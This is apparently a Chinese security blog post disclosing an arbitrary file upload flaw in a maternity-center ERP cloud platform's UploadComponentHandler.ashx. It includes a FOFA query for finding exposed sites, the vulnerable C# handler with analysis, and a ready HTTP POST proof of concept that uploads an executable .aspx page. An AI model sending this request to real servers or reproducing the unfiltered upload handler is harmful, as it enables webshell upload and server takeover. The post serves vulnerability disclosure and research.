---
title: "月子会所ERP管理云平台 UploadComponentHandler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-UploadComponentHandler-rce.html
asset_dir: assets/月子会所erp管理云平台-uploadcomponenthandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 UploadComponentHandler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/23 08:40
- 656浏览
- [0评论](#comment)
- 1小时阅读

深入探索

安全研究工具

SQL注入检测工具

编程语言教程

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理[软件](#)。月子会所ERP管理云平台的 Page/UploadComponent/UploadComponentHandler.ashx 和 Page/upload/UploadComponentHandler.ashx 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，攻击者可利用该漏洞上传webshell获取服务器权限。

漏洞扫描服务

# fofa语法

> `body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"`

# 漏洞分析

两处出发路径的代码逻辑实现一样，直接看 UploadComponentHandler 的业务逻辑实现

```
<%@ WebHandler Language="C#" Class="UploadComponentHandler" %>

using System;
using System.Web;
using System.IO;
using System.Configuration;

public class UploadComponentHandler : IHttpHandler {

    // static string OosUrl = ConfigurationManager.AppSettings["OosUrl"]+"/";//OOS上传域名地址
    static string OOsUrl = ConfigurationManager.AppSettings["uploadOosUrl"];//OOS上传根目录地址
    static string url =""; //定义原图上传文件路径
    static string Slturl =""; //定义缩略图上传文件路径
    static string ErpUrl = ConfigurationManager.AppSettings["uploadErpUrl"];//本地上传根目录下文件夹
    static string UploadPosition = ConfigurationManager.AppSettings["UploadPosition"];//上传位置(0:表示本地服务器,1:表示OOS)
    static string BdSltUrl = "UploadBaseFolder/Thumbnail";//存储缩略图的本地文件路径根目录文件夹
    static string BdYtUrl = "UploadBaseFolder";//存储缩原图的本地文件路径根目录文件夹
    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        string UploadPositionType = "";
        RequestG.GetParams("UploadPositionType", ref UploadPositionType);
        if (!string.IsNullOrEmpty(UploadPositionType))
        {
            UploadPosition = UploadPositionType;//根据上传模块的需求来设置上传位置的参数,可以设置固定上传到oos或者本地
        }
        if (UploadPosition == "1")//根据webConfig里面参数配置,当为1的时候上传到OOs服务器
        {
            url=OOsUrl+"/"+DateTime.Now.ToString("yyyyMM")+"/"; //定义OOs上传文件路径
        }
        else
        {
            url=ErpUrl+"/"+DateTime.Now.ToString("yyyyMM")+"/"; //定义本地ERP上传文件路径
            Slturl=BdSltUrl+"/"+ErpUrl+"/"+DateTime.Now.ToString("yyyyMM")+"/"; //定义本地ERP上传文件路径
        }
        string a = "";
        try
        {
            HttpFileCollection file = context.Request.Files;//获取选中的文件
            for (int i = 0; i < file.Count; i++)
            {
                string cFileName = Path.GetFileName(file[i].FileName.Trim());
                string tuozhanming = cFileName.Substring(cFileName.LastIndexOf(".")).ToLower();     //拓展名
                string fileName = cFileName.Substring(0, cFileName.LastIndexOf(".")).ToLower();     //没有拓展名文件名称
                string newname = GetNewName(fileName,tuozhanming);//新的文件名称                                                                           

                string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(file[i].FileName.Trim());
                string cFileType = Path.GetExtension(file[i].FileName.Trim());
                if (file == null || string.IsNullOrWhiteSpace(file[i].FileName) || file[i].ContentLength == 0 || cFileType.Length < 2)
                {
                    a = "{\"code\":\"0\",\"src\":\"\",\"name\":\"\",\"msg\":\"上传失败\"}";
                    context.Response.Write(a);
                }
                string tmp = file[i].FileName.Trim();
                if (UploadPosition == "1")//根据webConfig里面参数配置,当为1的时候上传到OOs服务器
                {
                    System.IO.Stream strem = file[i].InputStream;//将所要上传文件转换成流
                    OosUpload.PutObjectFromFile(url,newname, strem);//上传文件至oos
                    a = "{\"code\":\"1\",\"src\":\""+ url + newname + "\",\"name\":\"" + newname + "\",\"msg\":\"上传成功\"}";
                }
                else //上传到本地服务器
                {
                    var basepath = context.Server.MapPath("../../" + BdYtUrl + "/" + url);//原图绝对路径
                    if (!Directory.Exists(basepath))
                    {
                        Directory.CreateDirectory(basepath);
                    }
                    HttpPostedFile mypost = file[i];
                    mypost.SaveAs(string.Format("{0}/{1}", basepath, newname));//保存文件

                    var baseSltpath = context.Server.MapPath("../../" + Slturl);//原图绝对路径
                    if (!Directory.Exists(baseSltpath))
                    {
                        Directory.CreateDirectory(baseSltpath);
                    }
                    if (tuozhanming==".png"||tuozhanming==".jpg"||tuozhanming==".jepg"||tuozhanming==".bmp") {//图片才需要压缩,其它文件不需要压缩

                        w_Base.MakeThumbnail(context.Server.MapPath("../../" + BdYtUrl + "/" + url + "/" + newname), context.Server.MapPath("../../" + Slturl + "/" + newname), 120, 130, "DB");
                    }

                    a = "{\"code\":\"1\",\"src\":\"" + BdYtUrl + "/" + url + newname + "\",\"name\":\"" + newname + "\",\"msg\":\"上传成功\"}";
                }
                System.Threading.Thread.Sleep(1000);

                context.Response.Write(a);
            }
        }
        catch (Exception)
        {
            a = "{\"code\":\"-1\",\"src\":\"\",\"name\":\"\",\"msg\":\"上传出错\"}";
            context.Response.Write(a);
        }
    }

    public string GetNewName(string fileName, string name)
    {
        string time = DateTime.Now.ToString("yyMMddHHmmssffff");
        return fileName + "_" + time + new Random().Next(000, 999) + name;
    }

    public bool IsReusable {
        get {
            return false;
        }
    }

}
```

其实注释已经很清楚了

物流软件安全

```
static string UploadPosition = ConfigurationManager.AppSettings["UploadPosition"];//上传位置(0:表示本地服务器,1:表示OOS)
```

这里根据配置文件里的 UploadPosition 值来决定上传到本地还是OOS上，大多数都是本地。且下面又根据请求参数 UploadPositionType 来重新设置上传位置

```
string UploadPositionType = "";
        RequestG.GetParams("UploadPositionType", ref UploadPositionType);
        if (!string.IsNullOrEmpty(UploadPositionType))
        {
            UploadPosition = UploadPositionType;//根据上传模块的需求来设置上传位置的参数,可以设置固定上传到oos或者本地
        }
```

因此我们只需要在请求中设置 UploadPositionType=0 即可上传到服务器本地。

剩下的就是常规的上传、重命名、对图片后缀进行缩略图处理等，并无特殊后缀过滤，且会回显上传文件路径，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /Page/upload/UploadComponentHandler.ashx?UploadPositionType=0 HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=--WebKitFormBoundaryWPL35TV23dfr1cNr

--WebKitFormBoundaryWPL35TV23dfr1cNr
Content-Disposition: form-data; name="file"; filename="t.aspx"

<%@Page Language="C#"%><%Response.Write(DateTime.Now.ToString());System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
--WebKitFormBoundaryWPL35TV23dfr1cNr--
```

[![月子会所ERP管理云平台 UploadComponentHandler.ashx 任意文件上传漏洞](images/img-001-4bd743c72667.webp)](https://image.mrxn.net/38ecadd2242b4043a9c07b07426933c4.webp)

成功上传测试POC并回显文件路径。

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
